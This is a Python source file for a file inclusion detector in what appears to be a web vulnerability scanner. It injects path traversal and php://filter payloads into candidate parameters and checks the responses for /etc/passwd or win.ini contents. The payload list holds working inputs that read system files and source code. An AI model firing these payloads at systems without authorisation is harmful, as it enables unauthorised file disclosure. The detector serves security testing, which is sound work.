import asyncio
import logging
import re
from urllib.parse import parse_qsl, urlparse

from app.core.detectors.base_detector import BaseDetector, Finding
from app.core.verification.verification_framework import HttpVerifier, URLParameterBuilder
from app.models.vulnerability import OwaspCategory, SeverityLevel

logger = logging.getLogger(__name__)


class FileInclusionDetector(BaseDetector):
    name = "file_inclusion"

    fi_param_tokens = {
        "page", "file", "path", "include", "template", "doc", "dir", "load", "url", "src", "dest", "view"
    }

    # LFI proof-of-concept payloads
    LFI_PAYLOADS = [
        # Linux
        ("../../../../etc/passwd", r"root:x:0:0:", "Linux /etc/passwd LFI"),
        ("....//....//....//....//etc/passwd", r"root:x:0:0:", "Linux nested traversal LFI"),
        ("/etc/passwd", r"root:x:0:0:", "Linux absolute LFI"),
        # Windows
        ("../../../../windows/win.ini", r"\[fonts\]|\[extensions\]", "Windows win.ini LFI"),
        ("C:\\windows\\win.ini", r"\[fonts\]|\[extensions\]", "Windows absolute win.ini LFI"),
        ("..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", r"\[fonts\]|\[extensions\]", "Windows traversal LFI"),
        # Wrapper
        ("php://filter/convert.base64-encode/resource=index.php", r"[a-zA-Z0-9+/=]{20,}", "PHP Filter Base64 LFI"),
    ]

    async def detect(self, urls: list[str], forms: list[object], **kwargs: object) -> list[Finding]:
        findings: list[Finding] = []
        session_cookies = kwargs.get("session_cookies") or {}

        # 1. Candidate extraction
        candidates = set()

        for url in urls:
            parsed = urlparse(url)
            query_params = parse_qsl(parsed.query, keep_blank_values=True)
            for param_name, param_value in query_params:
                param_lower = param_name.lower()
                if param_lower in self.fi_param_tokens or any(tok in param_lower for tok in ["file", "page", "path", "inc"]):
                    candidates.add((url, param_name, "GET", param_value))

        for form in forms:
            form_url = getattr(form, "action", getattr(form, "page_url", ""))
            form_method = getattr(form, "method", "POST").upper()
            raw_inputs = list(getattr(form, "inputs", []))
            for inp in raw_inputs:
                inp_name = getattr(inp, "name", "")
                if inp_name:
                    inp_name_lower = inp_name.lower()
                    if inp_name_lower in self.fi_param_tokens or any(tok in inp_name_lower for tok in ["file", "page"]):
                        candidates.add((form_url, inp_name, form_method, ""))

        if not candidates:
            return []

        # 2. Active Verification
        semaphore = asyncio.Semaphore(4)
        verifier = HttpVerifier(cookies=session_cookies)

        async def verify_candidate(cand) -> list[Finding]:
            cand_url, param, method, val = cand
            cand_findings = []

            async with semaphore:
                # Test baseline first
                try:
                    baseline_url, baseline_params, baseline_data = URLParameterBuilder.inject_parameter(
                        cand_url, param, val, method
                    )
                    baseline = await verifier.send_request(baseline_url, method, baseline_params, baseline_data)
                    
                    for payload, regex_pattern, desc in self.LFI_PAYLOADS:
                        # Make sure payload isn't already matching in baseline to avoid false positives
                        if re.search(regex_pattern, baseline.body, re.I):
                            continue

                        injected_url, injected_params, injected_data = URLParameterBuilder.inject_parameter(
                            cand_url, param, payload, method
                        )
                        injected = await verifier.send_request(injected_url, method, injected_params, injected_data)

                        if injected.status_code == 200 and re.search(regex_pattern, injected.body, re.I):
                            # Verified LFI!
                            cand_findings.append(
                                Finding(
                                    category=OwaspCategory.a01,
                                    vuln_type="Local File Inclusion (LFI)",
                                    severity=SeverityLevel.critical,
                                    url=cand_url,
                                    parameter=param,
                                    method=method,
                                    payload=payload,
                                    evidence=f"Local File Inclusion verified via payload '{payload}' ({desc}). Pattern '{regex_pattern}' matched in response.",
                                    confidence_score=95.0,
                                    detection_method="file_retrieval",
                                    reproducible=True,
                                    verified=True,
                                    verification_request_snippet=injected.request_snippet,
                                    verification_response_snippet=injected.response_snippet,
                                )
                            )
                            # Stop testing this parameter once LFI is found
                            break
                except Exception as e:
                    logger.error("LFI verification failed for %s param %s: %s", cand_url, param, e)
            return cand_findings

        tasks = [verify_candidate(c) for c in candidates]
        results = await asyncio.gather(*tasks)
        for res in results:
            findings.extend(res)

        await verifier.close()
        return findings
